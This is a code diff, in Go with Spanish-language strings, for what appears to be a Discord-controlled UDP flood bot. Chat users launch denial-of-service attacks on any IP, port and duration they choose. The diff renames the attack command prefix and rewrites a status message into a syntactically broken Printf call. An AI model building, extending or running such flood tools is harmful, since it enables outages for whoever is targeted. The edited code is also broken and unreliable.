@@ -91,7 +91,7 @@ func runFlood(target string, port, duration int) {
 	var wg sync.WaitGroup
 	wg.Add(threads)
 
-	fmt.Printf("Iniciando ataque UDP a %s:%d con %d threads, %d PPS y tamaño de paquete %d bytes\n", target, port, threads, ppsLimit, packetSize)
+	fmt.Printf("Iniciando ataque UDPPPS\n"
 
 	for i := 0; i < threads; i++ {
 		go flood(target, port, duration, &wg)
@@ -132,10 +132,10 @@ func main() {
 			return
 		}
 		content := m.Content
-		if strings.HasPrefix(content, "!ataque") {
+		if strings.HasPrefix(content, ".ataque") {
 			args := strings.Fields(content)
 			if len(args) == 1 {
-				s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
+				s.ChannelMessageSend(m.ChannelID, "`.ataque udp [IP] [PUERTO] [TIEMPO]`")
 				return
 			}
 			if len(args) == 5 && args[1] == "udp" {
@@ -153,7 +153,7 @@ func main() {
 				}()
 				return
 			}
-			s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
+			s.ChannelMessageSend(m.ChannelID, "`.ataque udp [IP] [PUERTO] [TIEMPO]`")
 		}
 	})
 
